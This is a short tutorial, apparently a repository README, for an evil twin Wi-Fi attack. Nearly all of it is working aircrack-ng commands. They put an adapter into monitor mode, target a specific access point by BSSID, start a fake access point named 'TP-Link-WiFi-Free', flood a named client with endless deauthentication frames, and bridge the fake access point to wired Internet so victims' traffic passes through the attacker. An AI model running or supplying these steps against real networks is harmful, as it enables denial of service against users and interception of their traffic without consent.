# Evil-Twin-Attack

1. Prerequisites
apt-get update	
apt-get upgrade
             apt-get install bridge-utils
2. Creating the Environment
I) Start the Wireless monitoring Interface on wlan0
Ifconfig -> to check wlan name
airmon-ng start wlan0  
-> Start monitor mode on the wlan0.
airodump-ng wlan0mon 
-> to see what is out there wirelessly and channels they are using.
	
airodump-ng --bssid 74:DA:88:BF:4C:BA -c 11 wlan0mon
	-> To monitor the target AP and the channel it provides service through.
II) Make a fake Access Point (Evil Twin)
airbase-ng --essid “TP-Link-WiFi-Free” -c 11 wlan0mon
	-> Starts our fake ap with name “TP-Link-WiFi-Free” with Wi-Fi channel 11.
III) Launching a Deauth Attack
              aireplay-ng --deauth 0 -a 74:DA:88:BF:4C:BA -c 4E:74:16:2D:80:FC wlan0mon.
		-> Here, --deauth 0 means that frames were sent in an endless loop.
                             -> -a defines BSSID of the real AP.
                             -> -c defines MAC of our device that we want to shoot down the connection.
IV) Bridge Interface of Devices to Connect to the Internet
	brctl addbr evil
		-> This command adds a new bridge named “evil”.
	brctl addif evil at0
	brctl addif evil eth0
		-> Bridging the two interfaces at0 and eth0 with the evil interface.
	ifconfig at0 0.0.0.0 up
	ifconfig evil up
		-> Turning on all the new interfaces with the above commands.
	dhclient evil
		-> Using this command, we autoconfigure the DHCP settings on our Wi-Fi adapter.
